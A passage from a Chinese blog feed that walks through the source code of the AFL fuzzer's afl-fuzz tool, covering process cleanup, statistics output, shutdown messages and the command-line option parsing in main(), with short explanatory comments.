class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">    <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进程清理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_bitmap</span>();</span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br></pre></td></tr></table></figure><p>最后统计信息以及数据的保存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">     stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"><span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果运行了30min还在第一轮，则提示结果不完整</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fclose</span>(plot_file);</span><br><span class="line"><span class="built_in">destroy_queue</span>();</span><br><span class="line"><span class="built_in">destroy_extras</span>();</span><br><span class="line"><span class="built_in">ck_free</span>(target_path);</span><br><span class="line"><span class="built_in">ck_free</span>(sync_id);</span><br><span class="line"></span><br><span class="line"><span class="built_in">alloc_report</span>();</span><br></pre></td></tr></table></figure><p>资源销毁和内存清理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">OKF</span>(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>最后优雅的退出</p><blockquote><p>之后我会尝试去理解一个AFL++以及libFuzz的设计，前提是我看得懂😎😎🥳</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AFL-fuzz源码阅读&quot;&gt;&lt;a href=&quot;#AFL-fuzz源码阅读&quot; class=&quot;headerlink&quot; title=&quot;AFL-fuzz源码阅读&quot;&gt;&lt;/a&gt;AFL-fuzz源码阅读&lt;/h1&gt;&lt;h2 id=&quot;perform-dry-run-use-argv&quot;</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>AFL源码阅读之afl-fuzz(1)</title>
    <link href="http://s1nec-1o.github.io/2025/08/11/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz-1/"/>
    <id>http://s1nec-1o.github.io/2025/08/11/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz-1/</id>
    <published>2025-08-11T07:56:05.000Z</published>
    <updated>2025-08-11T07:56:56.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl-fuzz源码阅读"><a href="#afl-fuzz源码阅读" class="headerlink" title="afl-fuzz源码阅读"></a>afl-fuzz源码阅读</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 opt;</span><br><span class="line">  u64 prev_queued = <span class="number">0</span>;</span><br><span class="line">  u32 sync_interval_cnt = <span class="number">0</span>, seek_to;</span><br><span class="line">  u8  *extras_dir = <span class="number">0</span>;</span><br><span class="line">  u8  mem_limit_given = <span class="number">0</span>;</span><br><span class="line">  u8  exit_1 = !!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_BENCH_JUST_ONE&quot;</span>);</span><br><span class="line">  <span class="type">char</span>** use_argv;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line">  <span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_signal_handlers</span>();</span><br><span class="line">  <span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span 